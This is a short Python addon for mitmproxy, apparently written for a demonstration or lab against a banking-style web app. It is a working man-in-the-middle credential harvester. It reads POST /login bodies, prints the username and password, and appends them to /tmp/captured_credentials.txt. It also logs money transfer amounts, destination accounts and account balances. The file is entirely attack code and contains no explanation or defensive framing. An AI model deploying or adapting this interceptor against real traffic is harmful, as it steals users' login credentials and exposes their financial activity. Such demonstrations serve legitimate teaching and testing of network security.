from mitmproxy import http
import json
from datetime import datetime

class MITMInterceptor:
    def request(self, flow: http.HTTPFlow) -> None:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"\n{'='*60}")
        print(f"[{timestamp}] INTERCEPTED REQUEST")
        print(f"URL: {flow.request.pretty_url}")
        
        if flow.request.path == "/login" and flow.request.method == "POST":
            try:
                body = flow.request.content.decode('utf-8')
                data = json.loads(body)
                print(f"\n🚨 CREDENTIALS CAPTURED!")
                print(f"Username: {data.get('username')}")
                print(f"Password: {data.get('password')}")
                
                with open('/tmp/captured_credentials.txt', 'a') as f:
                    f.write(f"[{timestamp}] Username: {data.get('username')}, Password: {data.get('password')}\n")
            except:
                pass
        
        if flow.request.path == "/transfer" and flow.request.method == "POST":
            try:
                body = flow.request.content.decode('utf-8')
                data = json.loads(body)
                print(f"\n💰 TRANSFER INTERCEPTED!")
                print(f"Amount: ${data.get('amount')}")
                print(f"To: {data.get('to_account')}")
            except:
                pass
    
    def response(self, flow: http.HTTPFlow) -> None:
        if flow.request.path == "/login":
            try:
                body = flow.response.content.decode('utf-8')
                data = json.loads(body)
                if data.get('success'):
                    print(f"✅ Balance: ${data.get('balance')}")
            except:
                pass

addons = [MITMInterceptor()]
